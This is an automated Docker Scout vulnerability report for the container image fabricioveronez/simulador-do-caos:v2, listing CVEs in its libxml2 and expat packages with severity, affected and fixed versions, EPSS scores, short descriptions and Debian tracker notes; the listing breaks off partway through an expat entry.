<h2>:mag: Vulnerabilities of <code>fabricioveronez/simulador-do-caos:v2</code></h2>

<details open="true"><summary>:package: Image Reference</strong> <code>fabricioveronez/simulador-do-caos:v2</code></summary>
<table>
<tr><td>digest</td><td><code>sha256:5f035b1378b6019c6ea15b15a63f630e01274974a2af351c0c3a71dec2ce86b7</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 10" src="https://img.shields.io/badge/critical-10-8b1924"/> <img alt="high: 75" src="https://img.shields.io/badge/high-75-e25d68"/> <img alt="medium: 102" src="https://img.shields.io/badge/medium-102-fbb552"/> <img alt="low: 225" src="https://img.shields.io/badge/low-225-fce1a9"/> <img alt="unspecified: 4" src="https://img.shields.io/badge/unspecified-4-lightgrey"/></td></tr>
<tr><td>platform</td><td>linux/amd64</td></tr>
<tr><td>size</td><td>487 MB</td></tr>
<tr><td>packages</td><td>901</td></tr>
</table>
</details></table>
</details>

<table>
<tr><td valign="top">
<details><summary><img alt="critical: 2" src="https://img.shields.io/badge/C-2-8b1924"/> <img alt="high: 5" src="https://img.shields.io/badge/H-5-e25d68"/> <img alt="medium: 4" src="https://img.shields.io/badge/M-4-fbb552"/> <img alt="low: 5" src="https://img.shields.io/badge/L-5-fce1a9"/> <!-- unspecified: 0 --><strong>libxml2</strong> <code>2.9.14+dfsg-1.3~deb12u1</code> (deb)</summary>

<small><code>pkg:deb/debian/libxml2@2.9.14%2Bdfsg-1.3~deb12u1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-49796?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.9.14%2Bdfsg-1.3%7Edeb12u3"><img alt="critical : CVE--2025--49796" src="https://img.shields.io/badge/CVE--2025--49796-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.9.14+dfsg-1.3~deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>2.9.14+dfsg-1.3~deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.501%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>65th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in libxml2. Processing certain sch:name elements from the input XML file can trigger a memory corruption issue. This flaw allows an attacker to craft a malicious XML input file that can lead libxml to crash, resulting in a denial of service or other possible undefined behavior due to sensitive data being corrupted in memory.

---
- libxml2 2.12.7+dfsg+really2.9.14-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1107752)
[bookworm] - libxml2 2.9.14+dfsg-1.3~deb12u3
https://gitlab.gnome.org/GNOME/libxml2/-/issues/933
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/71e1e8af5ee46dad1b57bb96cfbf1c3ad21fbd7b

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-49794?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.9.14%2Bdfsg-1.3%7Edeb12u3"><img alt="critical : CVE--2025--49794" src="https://img.shields.io/badge/CVE--2025--49794-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.9.14+dfsg-1.3~deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>2.9.14+dfsg-1.3~deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.287%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>52nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A use-after-free vulnerability was found in libxml2. This issue occurs when parsing XPath elements under certain circumstances when the XML schematron has the <sch:name path="..."/> schema elements. This flaw allows a malicious actor to craft a malicious XML document used as input for libxml, resulting in the program's crash using libxml or other possible undefined behaviors.

---
- libxml2 2.12.7+dfsg+really2.9.14-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1107755)
[bookworm] - libxml2 2.9.14+dfsg-1.3~deb12u3
https://gitlab.gnome.org/GNOME/libxml2/-/issues/931
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/71e1e8af5ee46dad1b57bb96cfbf1c3ad21fbd7b

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-49043?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.9.14%2Bdfsg-1.3%7Edeb12u2"><img alt="high : CVE--2022--49043" src="https://img.shields.io/badge/CVE--2022--49043-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.028%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

xmlXIncludeAddNode in xinclude.c in libxml2 before 2.11.0 has a use-after-free.

---
[experimental] - libxml2 2.12.3+dfsg-0exp1
- libxml2 2.12.7+dfsg+really2.9.14-0.4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1094238)
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/5a19e21605398cef6a8b1452477a8705cb41562b (v2.11.0)
https://github.com/php/php-src/issues/17467

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-24928?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.9.14%2Bdfsg-1.3%7Edeb12u2"><img alt="high : CVE--2025--24928" src="https://img.shields.io/badge/CVE--2025--24928-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.044%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libxml2 before 2.12.10 and 2.13.x before 2.13.6 has a stack-based buffer overflow in xmlSnprintfElements in valid.c. To exploit this, DTD validation must occur for an untrusted document or untrusted DTD. NOTE: this is similar to CVE-2017-9047.

---
- libxml2 2.12.7+dfsg+really2.9.14-0.4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098321)
https://gitlab.gnome.org/GNOME/libxml2/-/issues/847
https://www.openwall.com/lists/oss-security/2025/02/18/2
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/8c8753ad5280ee13aee5eec9b0f6eee2ed920f57
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/858ca26c0689161a6b903a6682cc8a1cc10a0ea8 (v2.12.10)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-56171?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.9.14%2Bdfsg-1.3%7Edeb12u2"><img alt="high : CVE--2024--56171" src="https://img.shields.io/badge/CVE--2024--56171-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.048%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libxml2 before 2.12.10 and 2.13.x before 2.13.6 has a use-after-free in xmlSchemaIDCFillNodeTables and xmlSchemaBubbleIDCNodeTables in xmlschemas.c. To exploit this, a crafted XML document must be validated against an XML schema with certain identity constraints, or a crafted XML schema must be used.

---
- libxml2 2.12.7+dfsg+really2.9.14-0.4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098320)
https://gitlab.gnome.org/GNOME/libxml2/-/issues/828
https://www.openwall.com/lists/oss-security/2025/02/18/2
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/5880a9a6bd97c0f9ac8fc4f30110fe023f484746
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/245b70d7d2768572ae1b05b3668ca858b9ec4ed4 (v2.12.10)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-6021?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.9.14%2Bdfsg-1.3%7Edeb12u3"><img alt="high : CVE--2025--6021" src="https://img.shields.io/badge/CVE--2025--6021-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.9.14+dfsg-1.3~deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>2.9.14+dfsg-1.3~deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.442%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>63rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in libxml2's xmlBuildQName function, where integer overflows in buffer size calculations can lead to a stack-based buffer overflow. This issue can result in memory corruption or a denial of service when processing crafted input.

---
- libxml2 2.12.7+dfsg+really2.9.14-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1107720)
[bookworm] - libxml2 2.9.14+dfsg-1.3~deb12u3
https://gitlab.gnome.org/GNOME/libxml2/-/issues/926
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/ad346c9a249c4b380bf73c460ad3e81135c5d781 (master)
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/acbbeef9f5dcdcc901c5f3fa14d583ef8cfd22f0 (2.14-branch)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-25062?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.9.14%2Bdfsg-1.3%7Edeb12u2"><img alt="high : CVE--2024--25062" src="https://img.shields.io/badge/CVE--2024--25062-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.131%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in libxml2 before 2.11.7 and 2.12.x before 2.12.5. When using the XML Reader interface with DTD validation and XInclude expansion enabled, processing crafted XML documents can lead to an xmlValidatePopElement use-after-free.

---
[experimental] - libxml2 2.12.5+dfsg-0exp1
- libxml2 2.12.7+dfsg+really2.9.14-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1063234)
[buster] - libxml2 <no-dsa> (Minor issue)
https://gitlab.gnome.org/GNOME/libxml2/-/issues/604
https://gitlab.gnome.org/GNOME/libxml2/-/commit/2b0aac140d739905c7848a42efc60bfe783a39b7 (v2.11.7)
https://gitlab.gnome.org/GNOME/libxml2/-/commit/92721970884fcc13305cb8e23cdc5f0dd7667c2c (v2.12.5)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-45322?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.9.14%2Bdfsg-1.3%7Edeb12u2"><img alt="medium : CVE--2023--45322" src="https://img.shields.io/badge/CVE--2023--45322-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.076%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libxml2 through 2.11.5 has a use-after-free that can only occur after a certain memory allocation fails. This occurs in xmlUnlinkNode in tree.c. NOTE: the vendor's position is "I don't think these issues are critical enough to warrant a CVE ID ... because an attacker typically can't control when memory allocations fail."

---
[experimental] - libxml2 2.12.3+dfsg-0exp1
- libxml2 2.12.7+dfsg+really2.9.14-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1053629)
[buster] - libxml2 <postponed> (Minor issue, very hard/unlikely to trigger)
https://gitlab.gnome.org/GNOME/libxml2/-/issues/583
Originally fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/d39f78069dff496ec865c73aa44d7110e429bce9 (v2.12.0)
Introduced regression (and thus commit reverted temporarily upstream):
https://gitlab.gnome.org/GNOME/libxml2/-/issues/634
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/30d7660ba87c8487b26582ccc050f4d2880ccb3c (v2.12.2)
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/8707838e69f9c6e729c1d1d46bb3681d9e622be5 (v2.13.0)
https://gitlab.gnome.org/GNOME/libxml2/-/issues/344
http://www.openwall.com/lists/oss-security/2023/10/06/5

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-39615?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.9.14%2Bdfsg-1.3%7Edeb12u2"><img alt="medium : CVE--2023--39615" src="https://img.shields.io/badge/CVE--2023--39615-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.112%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>30th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Xmlsoft Libxml2 v2.11.0 was discovered to contain an out-of-bounds read via the xmlSAX2StartElement() function at /libxml2/SAX2.c. This vulnerability allows attackers to cause a Denial of Service (DoS) via supplying a crafted XML file. NOTE: the vendor's position is that the product does not support the legacy SAX1 interface with custom callbacks; there is a crash even without crafted input.

---
[experimental] - libxml2 2.12.3+dfsg-0exp1
- libxml2 2.12.7+dfsg+really2.9.14-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1051230)
[buster] - libxml2 <no-dsa> (Minor issue)
https://gitlab.gnome.org/GNOME/libxml2/-/issues/535
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/d0c3f01e110d54415611c5fa0040cdf4a56053f9 (v2.12.0)
Followup: https://gitlab.gnome.org/GNOME/libxml2/-/commit/235b15a590eecf97b09e87bdb7e4f8333e9de129 (v2.12.0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-9714?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.9.14%2Bdfsg-1.3%7Edeb12u5"><img alt="medium : CVE--2025--9714" src="https://img.shields.io/badge/CVE--2025--9714-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.9.14+dfsg-1.3~deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>2.9.14+dfsg-1.3~deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.031%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Uncontrolled recursion in XPath evaluation in libxml2 up to and including version 2.9.14 allows a local attacker to cause a stack overflow via crafted expressions. XPath processing functions `xmlXPathRunEval`, `xmlXPathCtxtCompile`, and `xmlXPathEvalExpr` were resetting recursion depth to zero before making potentially recursive calls. When such functions were called recursively this could allow for uncontrolled recursion and lead to a stack overflow. These functions now preserve recursion depth across recursive calls, allowing recursion depth to be controlled.

---
- libxml2 2.14.5+dfsg-0.1
[trixie] - libxml2 2.12.7+dfsg+really2.9.14-2.1+deb13u2
[bookworm] - libxml2 2.9.14+dfsg-1.3~deb12u5
https://bugzilla.redhat.com/show_bug.cgi?id=2392605
https://gitlab.gnome.org/GNOME/libxslt/-/issues/148
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/677a42645ef22b5a50741bad5facf9d8a8bc6d21 (v2.10.0)
Test fixes in libxslt: https://gitlab.gnome.org/GNOME/libxslt/-/commit/b7994c3b7ab83b502f4298ab4abb10fb183f7ed4 (v1.1.36)
libxml2/2.14.5+dfsg-0.1 is actually not the earliest version in unstable
with the fix, but later on the version got reverted to 2.9.14 based one.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-32414?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.9.14%2Bdfsg-1.3%7Edeb12u2"><img alt="medium : CVE--2025--32414" src="https://img.shields.io/badge/CVE--2025--32414-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.058%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>18th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In libxml2 before 2.13.8 and 2.14.x before 2.14.2, out-of-bounds memory access can occur in the Python API (Python bindings) because of an incorrect return value. This occurs in xmlPythonFileRead and xmlPythonFileReadRaw because of a difference between bytes and characters.

---
- libxml2 2.12.7+dfsg+really2.9.14-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1102521)
https://gitlab.gnome.org/GNOME/libxml2/-/issues/889

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-32415?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.9.14%2Bdfsg-1.3%7Edeb12u2"><img alt="low : CVE--2025--32415" src="https://img.shields.io/badge/CVE--2025--32415-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.031%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In libxml2 before 2.13.8 and 2.14.x before 2.14.2, xmlSchemaIDCFillNodeTables in xmlschemas.c has a heap-based buffer under-read. To exploit this, a crafted XML document must be validated against an XML schema with certain identity constraints, or a crafted XML schema must be used.

---
- libxml2 2.12.7+dfsg+really2.9.14-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1103511)
https://gitlab.gnome.org/GNOME/libxml2/-/issues/890
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/487ee1d8711c6415218b373ef455fcd969d12399 (master)
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/8ac33b1c821b4e67326e8e416945b31c9537c7c0 (v2.14.2)
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/384cc7c182fc00c6d5e2ab4b5e3671b2e3f93c84 (v2.13.8)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-27113?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.9.14%2Bdfsg-1.3%7Edeb12u2"><img alt="low : CVE--2025--27113" src="https://img.shields.io/badge/CVE--2025--27113-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.217%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libxml2 before 2.12.10 and 2.13.x before 2.13.6 has a NULL pointer dereference in xmlPatMatch in pattern.c.

---
- libxml2 2.12.7+dfsg+really2.9.14-0.4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098322)
https://gitlab.gnome.org/GNOME/libxml2/-/issues/861
https://www.openwall.com/lists/oss-security/2025/02/18/2
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/6c716d491dd2e67f08066f4dc0619efeb49e43e6
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/503f788e84f1c1f1d769c2c7258d77faee94b5a3 (v2.12.10)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-8732?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.9.14%2Bdfsg-1.3%7Edeb12u5"><img alt="low : CVE--2025--8732" src="https://img.shields.io/badge/CVE--2025--8732-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.9.14+dfsg-1.3~deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.013%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in libxml2 up to 2.14.5. It has been declared as problematic. This vulnerability affects the function xmlParseSGMLCatalog of the component xmlcatalog. The manipulation leads to uncontrolled recursion. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used. The real existence of this vulnerability is still doubted at the moment. The code maintainer explains, that "[t]he issue can only be triggered with untrusted SGML catalogs and it makes absolutely no sense to use untrusted catalogs. I also doubt that anyone is still using SGML catalogs at all."

---
- libxml2 <unfixed> (unimportant)
https://gitlab.gnome.org/GNOME/libxml2/-/issues/958
https://gitlab.gnome.org/GNOME/libxml2/-/issues/958#note_2505853
Issue can only be triggered with untrusted SGML, negligible security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-6170?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.9.14%2Bdfsg-1.3%7Edeb12u3"><img alt="low : CVE--2025--6170" src="https://img.shields.io/badge/CVE--2025--6170-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.9.14+dfsg-1.3~deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>2.9.14+dfsg-1.3~deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.019%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the interactive shell of the xmllint command-line tool, used for parsing XML files. When a user inputs an overly long command, the program does not check the input size properly, which can cause it to crash. This issue might allow attackers to run harmful code in rare configurations without modern protections.

---
- libxml2 2.12.7+dfsg+really2.9.14-2.1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1107938; unimportant)
[bookworm] - libxml2 2.9.14+dfsg-1.3~deb12u3
https://gitlab.gnome.org/GNOME/libxml2/-/issues/941
Crash in CLI tool, no security impact
Fixed by https://gitlab.gnome.org/GNOME/libxml2/-/commit/c340e419505cf4bf1d9ed7019a87cc00ec200434 (2.14)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-34459?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.9.14%2Bdfsg-1.3%7Edeb12u2"><img alt="low : CVE--2024--34459" src="https://img.shields.io/badge/CVE--2024--34459-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.9.14+dfsg-1.3~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.847%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>74th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in xmllint (from libxml2) before 2.11.8 and 2.12.x before 2.12.7. Formatting error messages with xmllint --htmlout can result in a buffer over-read in xmlHTMLPrintFileContext in xmllint.c.

---
- libxml2 2.12.7+dfsg+really2.9.14-0.4 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1071162)
https://gitlab.gnome.org/GNOME/libxml2/-/issues/720
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/8ddc7f13337c9fe7c6b6e616f404b0fffb8a5145 (v2.11.8)
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac5392a4e891b81e40e592c3ac6cb46016ce (v2.12.7)
Crash in CLI tool, no security impact

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 2" src="https://img.shields.io/badge/C-2-8b1924"/> <img alt="high: 3" src="https://img.shields.io/badge/H-3-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>expat</strong> <code>2.5.0-1</code> (deb)</summary>

<small><code>pkg:deb/debian/expat@2.5.0-1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-45492?s=debian&n=expat&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.5.0-1%2Bdeb12u1"><img alt="critical : CVE--2024--45492" src="https://img.shields.io/badge/CVE--2024--45492-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.5.0-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>2.5.0-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.356%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>80th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in libexpat before 2.6.3. nextScaffoldPart in xmlparse.c can have an integer overflow for m_groupSize on 32-bit platforms (where UINT_MAX equals SIZE_MAX).

---
- expat 2.6.2-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1080152)
- libxmltok <removed>
[bookworm] - libxmltok <ignored> (Minor issue, no runtime dependencies left)
https://github.com/libexpat/libexpat/pull/892
https://github.com/libexpat/libexpat/issues/889
https://github.com/libexpat/libexpat/commit/29ef43a0bab633b41e71dd6d900fff5f6b3ad5e4 (R_2_6_3)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-45491?s=debian&n=expat&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.5.0-1%2Bdeb12u1"><img alt="critical : CVE--2024--45491" src="https://img.shields.io/badge/CVE--2024--45491-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.5.0-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>2.5.0-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.677%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>71st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in libexpat before 2.6.3. dtdCopy in xmlparse.c can have an integer overflow for nDefaultAtts on 32-bit platforms (where UINT_MAX equals SIZE_MAX).

---
- expat 2.6.2-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1080150)
- libxmltok <removed>
[bookworm] - libxmltok <ignored> (Minor issue, no runtime dependencies left)
https://github.com/libexpat/libexpat/pull/891
https://github.com/libexpat/libexpat/issues/888
https://github.com/libexpat/libexpat/commit/b8a7dca4670973347892cfc452b24d9001dcd6f5 (R_2_6_3)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-8176?s=debian&n=expat&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.5.0-1%2Bdeb12u2"><img alt="high : CVE--2024--8176" src="https://img.shields.io/badge/CVE--2024--8176-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.5.0-1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.5.0-1+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.417%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>61st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A stack overflow vulnerability exists in the libexpat library due to the way it handles recursive entity expansion in XML documents. When parsing an XML document with deeply nested entity references, libexpat can be forced to recurse indefinitely, exhausting the stack space and causing a crash. This issue could lead to denial of service (DoS) or, in some cases, exploitable memory corruption, depending on the environment and library usage.

---
- expat 2.7.0-1
[bookworm] - expat 2.5.0-1+deb12u2
[bullseye] - expat <ignored> (Minor issue and too intrusive to backport)
- libxmltok <removed>
[bookworm] - libxmltok <ignored> (Minor issue, no runtime dependencies left)
https://blog.hartwork.org/posts/expat-2-7-0-released/
https://github.com/libexpat/libexpat/issues/893
https://github.com/libexpat/libexpat/pull/973
CentOS stream backport for 2.5.0: https://gitlab.com/redhat/centos-stream/rpms/expat/-/blob/c9s/expat-2.5.0-CVE-2024-8176.patch
https://www.openwall.com/lists/oss-security/2025/09/24/11
Follow-up: https://github.com/libexpat/libexpat/pull/1059 (R_2_7_3)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-45490?s=debian&n=expat&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.5.0-1%2Bdeb12u1"><img alt="high : CVE--2024--45490" src="https://img.shields.io/badge/CVE--2024--45490-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.5.0-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>2.5.0-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.541%</code></td></tr>
